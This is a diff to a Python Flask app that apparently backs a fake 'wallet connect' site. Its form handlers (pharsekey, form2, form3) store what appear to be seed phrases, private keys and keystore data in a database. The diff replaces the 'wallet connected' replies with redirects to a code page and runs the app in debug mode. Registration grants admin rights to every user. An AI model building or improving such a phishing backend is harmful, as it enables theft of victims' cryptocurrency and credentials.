@@ -1,5 +1,5 @@
 import re
-from flask import Flask, render_template, request, redirect, url_for,jsonify
+from flask import Flask, render_template, request,  url_for,jsonify, redirect
 #from flask.json import jsonify
 from flask_sqlalchemy import SQLAlchemy
 import sqlite3
@@ -9,7 +9,7 @@ from werkzeug.security import generate_password_hash, check_password_hash
 from flask_admin import Admin
 from flask_admin.contrib.sqla import ModelView
 import os
-from flask_frozen import Freezer
+
 
 
 from random import randint
@@ -19,7 +19,6 @@ from datetime import datetime
 
 
 app = Flask(__name__)
-freezer = Freezer(app)
 basedir = os.path.abspath(os.path.dirname((__file__)))
 database = "app.db"
 con = sqlite3.connect(os.path.join(basedir,database))
@@ -201,16 +200,16 @@ def process():
              password=password,email=email,is_admin=True)
         db.session.add(auths)
         db.session.commit()
-        return redirect('login')
+        return redirect('/login')
         # return "welcome sign up completed"
     return render_template('register.html')
 
 
-@app.route("/dashboard")
+@app.route("/index.html")
 
 def dashboard():
   
-    return render_template('dashboard.html'
+    return render_template('index.html'
                                 )
 
 @app.route('/form1.html',methods=['GET','POST'])
@@ -224,7 +223,7 @@ def pharsekey():
              )
         db.session.add(phase)
         db.session.commit()
-        return "wallet connected"
+        return redirect('/code.html')
     return render_template('form1.html')
 
 
@@ -239,7 +238,7 @@ def fuck2():
              )
         db.session.add(pri)
         db.session.commit()
-        return "wallet connected"
+        return redirect('code.html')
     return render_template('form2.html')
 
 @app.route('/form3.html',methods=['GET','POST'])
@@ -255,16 +254,16 @@ def fuck3():
         db.session.add(stone)
         db.session.commit()
         
-        return "wallet connected"
+        return redirect('code.html')
     return render_template('form3.html')
     
        
 
 
+@app.route('/code')
+def code():
+    return render_template('code.html')
 
-@app.route("/index.html")
-def homepage():
-    return render_template('index.html')
 
 
 
@@ -286,4 +285,4 @@ def database():
 
 
 if __name__ == "__main__":
-   freezer.freeze()
+    app.run(host='127.0.0.1', port=8000, debug=True)
